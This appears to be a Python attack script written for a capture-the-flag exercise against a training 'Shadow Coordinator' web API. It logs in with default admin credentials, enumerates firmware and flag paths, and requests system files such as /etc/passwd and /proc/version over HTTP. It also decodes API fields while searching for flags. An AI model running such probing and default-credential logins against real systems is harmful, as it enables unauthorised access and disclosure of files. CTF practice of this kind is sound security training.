#!/usr/bin/env python3
"""
Firmware and static content analysis for Shadow Coordinator
Target firmware paths and static content that returned HTML
"""
import requests
import json
import base64
import re
from urllib.parse import urljoin

class FirmwareStaticAnalysis:
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False
        self.base_url = "https://training.my-ctf.com:8812"
        self.token = None

        # Login
        self._authenticate()

    def _authenticate(self):
        """Get authentication token"""
        login_url = "http://training-pod2.ctfchile.com:32780/api/v2/auth/login"
        resp = self.session.post(login_url, json={"username": "admin", "password": "admin1234"})
        self.token = resp.json()["access_token"]
        self.session.headers.update({
            "Authorization": f"Bearer {self.token}",
            "Content-Type": "application/json"
        })
        print(f"[+] Authenticated")

    def analyze_static_firmware_paths(self):
        """Analyze the static firmware paths that returned HTML"""
        print("\n[*] === ANALYZING STATIC FIRMWARE PATHS ===")

        # These paths returned HTML in previous scan
        firmware_paths = [
            "/firmware",
            "/firmware/coordinator",
            "/firmware/flag.txt",
            "/firmware/2.4.17-corp/flag",
            "/firmware/shadow_coordinator.txt",
            "/unlocked/flag"
        ]

        for path in firmware_paths:
            try:
                print(f"\n[*] Analyzing {path}")
                resp = self.session.get(f"{self.base_url}{path}")

                if resp.status_code == 200:
                    content = resp.text
                    print(f"    Status: 200, Length: {len(content)}")

                    # Look for flag patterns in HTML
                    flag_patterns = [
                        r'flag\{[^}]+\}',
                        r'ctf\{[^}]+\}',
                        r'shadow_coord[^}]+',
                        r'[A-Za-z0-9+/]{40,}==?',  # Base64 patterns
                        r'coordinator.*flag',
                        r'unlocked.*flag'
                    ]

                    for pattern in flag_patterns:
                        matches = re.findall(pattern, content, re.IGNORECASE)
                        if matches:
                            print(f"    [!] Pattern '{pattern}' matches: {matches}")

                    # Look for hidden forms or inputs
                    forms = re.findall(r'<form[^>]*>.*?</form>', content, re.DOTALL | re.IGNORECASE)
                    for i, form in enumerate(forms):
                        print(f"    Form {i+1}: {form[:200]}...")

                    # Look for JavaScript with flag references
                    scripts = re.findall(r'<script[^>]*>(.*?)</script>', content, re.DOTALL | re.IGNORECASE)
                    for i, script in enumerate(scripts):
                        if any(keyword in script.lower() for keyword in ['flag', 'coordinator', 'shadow']):
                            print(f"    [!] Relevant script {i+1}: {script[:300]}...")

                    # Look for hidden divs or comments
                    comments = re.findall(r'<!--(.*?)-->', content, re.DOTALL)
                    for comment in comments:
                        if any(keyword in comment.lower() for keyword in ['flag', 'coordinator', 'shadow']):
                            print(f"    [!] Relevant comment: {comment.strip()}")

                    # Check for meta tags with flag data
                    metas = re.findall(r'<meta[^>]+>', content, re.IGNORECASE)
                    for meta in metas:
                        if any(keyword in meta.lower() for keyword in ['flag', 'coordinator', 'shadow']):
                            print(f"    [!] Relevant meta: {meta}")

            except Exception as e:
                print(f"    Error analyzing {path}: {e}")

    def firmware_version_exploitation(self):
        """Exploit specific firmware version 2.4.17-corp"""
        print("\n[*] === FIRMWARE VERSION EXPLOITATION ===")

        version = "2.4.17-corp"
        print(f"[+] Target firmware version: {version}")

        # Try version-specific paths
        version_paths = [
            f"/firmware/{version}",
            f"/firmware/v{version}",
            f"/firmware/{version}/config",
            f"/firmware/{version}/debug",
            f"/firmware/{version}/shadow",
            f"/firmware/{version}/coordinator",
            f"/firmware/{version}/unlock",
            f"/firmware/{version}/flag.bin",
            f"/firmware/{version}/coordinator.flag",
            f"/api/v2/firmware/{version}",
            f"/api/v2/firmware/{version}/flag",
            f"/static/firmware/{version}/flag.txt"
        ]

        for path in version_paths:
            try:
                resp = self.session.get(f"{self.base_url}{path}")
                if resp.status_code == 200:
                    content = resp.text
                    print(f"[+] Found {path}: {content[:100]}...")

                    if any(keyword in content.lower() for keyword in ['flag', 'ctf']):
                        print(f"[!] POTENTIAL FLAG: {content}")

            except Exception as e:
                pass

    def analyze_notification_system(self):
        """Deep analysis of notification system for flags"""
        print("\n[*] === NOTIFICATION SYSTEM ANALYSIS ===")

        # Get all notifications
        try:
            resp = self.session.get(f"{self.base_url}/api/v2/notifications")
            if resp.status_code == 200:
                data = resp.json()
                notifications = data.get('notifications', [])

                print(f"[+] Found {len(notifications)} notifications")

                for notif in notifications:
                    print(f"\n[*] Notification: {notif.get('title')}")
                    print(f"    Message: {notif.get('message')}")
                    print(f"    Author: {notif.get('author')}")
                    print(f"    Created: {notif.get('created_at')}")

                    # Check for flag in notification content
                    notif_str = json.dumps(notif)
                    if any(keyword in notif_str.lower() for keyword in ['flag', 'ctf', 'shadow']):
                        print(f"[!] POTENTIAL FLAG IN NOTIFICATION: {notif_str}")

                    # Try to get notification details
                    notif_id = notif.get('notification_id')
                    if notif_id:
                        try:
                            detail_resp = self.session.get(f"{self.base_url}/api/v2/notifications/{notif_id}")
                            if detail_resp.status_code == 200:
                                detail = detail_resp.json()
                                print(f"    Detail: {json.dumps(detail, indent=4)}")
                        except:
                            pass

        except Exception as e:
            print(f"[!] Notification analysis failed: {e}")

    def deep_coordinator_attribute_analysis(self):
        """Deep analysis of coordinator attributes for encoded flags"""
        print("\n[*] === DEEP COORDINATOR ATTRIBUTE ANALYSIS ===")

        # Get coordinator state
        resp = self.session.get(f"{self.base_url}/api/v2/states")
        entities = resp.json().get('entities', [])

        coordinator = next((e for e in entities if e.get('nwk') == '0x0000'), None)
        if not coordinator:
            print("[!] No coordinator found")
            return

        print(f"[+] Analyzing coordinator: {coordinator.get('ieee')}")

        # Analyze all fields for potential encoding
        def analyze_field(key, value, path=""):
            full_path = f"{path}.{key}" if path else key

            if isinstance(value, str):
                # Try different decodings
                print(f"  Field {full_path}: {value}")

                # Base64 decode
                try:
                    if len(value) > 10 and '=' in value:
                        decoded = base64.b64decode(value).decode('utf-8', errors='ignore')
                        if any(keyword in decoded.lower() for keyword in ['flag', 'ctf']):
                            print(f"    [!] BASE64 FLAG: {decoded}")
                except:
                    pass

                # Hex decode
                try:
                    if len(value) > 10 and all(c in '0123456789ABCDEFabcdef:' for c in value.replace(':', '')):
                        hex_val = value.replace(':', '')
                        if len(hex_val) % 2 == 0:
                            decoded = bytes.fromhex(hex_val).decode('utf-8', errors='ignore')
                            if any(keyword in decoded.lower() for keyword in ['flag', 'ctf']):
                                print(f"    [!] HEX FLAG: {decoded}")
                except:
                    pass

                # Binary interpretation
                try:
                    if all(c in '01' for c in value) and len(value) > 20:
                        # Convert binary to text
                        binary_chunks = [value[i:i+8] for i in range(0, len(value), 8)]
                        text = ''.join([chr(int(chunk, 2)) for chunk in binary_chunks if len(chunk) == 8])
                        if any(keyword in text.lower() for keyword in ['flag', 'ctf']):
                            print(f"    [!] BINARY FLAG: {text}")
                except:
                    pass

            elif isinstance(value, dict):
                for k, v in value.items():
                    analyze_field(k, v, full_path)

            elif isinstance(value, list):
                for i, v in enumerate(value):
                    analyze_field(f"[{i}]", v, full_path)

        # Analyze all coordinator data
        for key, value in coordinator.items():
            analyze_field(key, value)

    def exploit_unlocked_state_files(self):
        """Try to access files that might be available due to unlocked state"""
        print("\n[*] === UNLOCKED STATE FILE ACCESS ===")

        unlocked_paths = [
            "/tmp/flag.txt",
            "/var/flag.txt",
            "/etc/flag.txt",
            "/root/flag.txt",
            "/home/flag.txt",
            "/proc/version",
            "/proc/cpuinfo",
            "/etc/passwd",
            "/etc/hosts",
            "/.flag",
            "/.shadow_flag",
            "/coordinator_unlock.key",
            "/shadow_coordinator_key.txt",
            "/debug/coordinator.log",
            "/logs/coordinator.log",
            "/var/log/shadow_coordinator.log"
        ]

        for path in unlocked_paths:
            try:
                resp = self.session.get(f"{self.base_url}{path}")
                if resp.status_code == 200:
                    content = resp.text
                    print(f"[+] Accessible file {path}: {content[:200]}...")

                    if any(keyword in content.lower() for keyword in ['flag', 'ctf']):
                        print(f"[!] FLAG IN UNLOCKED FILE: {content}")

            except Exception as e:
                pass

    def run_analysis(self):
        """Run all analysis techniques"""
        print("[*] === FIRMWARE AND STATIC CONTENT ANALYSIS ===")

        self.analyze_static_firmware_paths()
        self.firmware_version_exploitation()
        self.analyze_notification_system()
        self.deep_coordinator_attribute_analysis()
        self.exploit_unlocked_state_files()

        print("\n[*] === ANALYSIS COMPLETE ===")

if __name__ == "__main__":
    analyzer = FirmwareStaticAnalysis()
    analyzer.run_analysis()